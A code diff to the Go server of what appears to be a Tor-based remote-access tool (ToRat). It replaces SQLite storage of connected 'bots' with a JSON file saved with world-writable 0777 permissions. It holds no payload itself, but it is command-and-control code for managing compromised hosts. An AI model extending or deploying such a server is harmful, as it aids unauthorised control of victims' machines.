@@ -4,6 +4,7 @@ import (
 	"context"
 	"crypto/ed25519"
 	"crypto/tls"
+	"encoding/json"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -16,25 +17,42 @@ import (
 	"github.com/cretz/bine/tor"
 	torEd25519 "github.com/cretz/bine/torutil/ed25519"
 	"github.com/fatih/color"
-	"gorm.io/driver/sqlite"
-	"gorm.io/gorm"
 )
 
-var db *gorm.DB
+var (
+	activeClients []activeClient
 
-var activeClients []activeClient
+	data struct {
+		Clients map[string]*Client
+	}
+)
+
+const dataFile = "/dist_ext/.data.json"
+
+func loadData() {
+	content, err := os.ReadFile(dataFile)
+	if err != nil {
+		return
+	}
+
+	if err := json.Unmarshal(content, &data); err != nil {
+		log.Println("Couldn't unmarshal data json:", err)
+	}
+}
+
+func saveData() {
+	content, err := json.MarshalIndent(&data, "", "\t")
+	if err != nil {
+		log.Panicln("Couldn't marshal data to json:", err)
+	}
+
+	if err := os.WriteFile(dataFile, content, 0777); err != nil {
+		log.Panicln("Couldn't write data to file:", err)
+	}
+}
 
 // Start runs the server
 func Start() error {
-	var err error // this is needed for gorm
-	db, err = gorm.Open(sqlite.Open("/dist_ext/ToRat.db"), &gorm.Config{})
-	if err != nil {
-		log.Fatalln("Could not open db", err)
-	}
-
-	// Migrate the schema
-	db.AutoMigrate(&Client{})
-
 	cert, err := tls.LoadX509KeyPair("../../torat_client/cert.pem", "../../keygen/priv_key.pem")
 	if err != nil {
 		return fmt.Errorf("could not load cert: %v", err)
@@ -75,37 +93,40 @@ func Start() error {
 }
 
 func accept(conn net.Conn) {
-	var c activeClient
+	var ac activeClient
 
-	c.RPC = rpc.NewClient(conn)
+	ac.RPC = rpc.NewClient(conn)
 
-	if err := c.GetHostname(); err != nil {
+	if err := ac.GetHostname(); err != nil {
 		log.Println("Invalid Hostname:", err)
 		return
 	}
-	c.Client = Client{
-		Hostname: c.Hostname,
-		Path:     filepath.Join("/dist_ext/bots", c.Hostname),
+
+	if data.Clients == nil {
+		data.Clients = make(map[string]*Client, 1)
 	}
 
-	db.FirstOrCreate(&c.Client, Client{Hostname: c.Hostname})
+	ac.Data().Hostname = ac.Hostname
+	ac.Data().Path = filepath.Join("/dist_ext/bots", ac.Hostname)
 
-	if _, err := os.Stat(c.Client.Path); err != nil {
-		os.MkdirAll(c.Client.Path, os.ModePerm)
+	if _, err := os.Stat(ac.Data().Path); err != nil {
+		os.MkdirAll(ac.Data().Path, os.ModePerm)
 	}
-	if c.Client.Name == "" {
-		c.Client.Name = c.Client.Hostname
+	if ac.Data().Name == "" {
+		ac.Data().Name = ac.Data().Hostname
 	}
 
-	db.Save(&c.Client)
-	activeClients = append(activeClients, c)
-	fmt.Println(green("[Server] [+] New Client: "), blue(c.Client.Name))
+	saveData()
+
+	activeClients = append(activeClients, ac)
+	fmt.Println(green("[Server] [+] New Client: "), blue(ac.Data().Name))
 }
 
 func listConn() []string {
 	var clients []string
 	for i, c := range activeClients {
-		str := strconv.Itoa(i) + "\t" + c.Client.Hostname + "\t" + c.Client.Name
+		client := data.Clients[c.Hostname]
+		str := strconv.Itoa(i) + "\t" + client.Hostname + "\t" + client.Name
 		clients = append(clients, str)
 	}
 	return clients
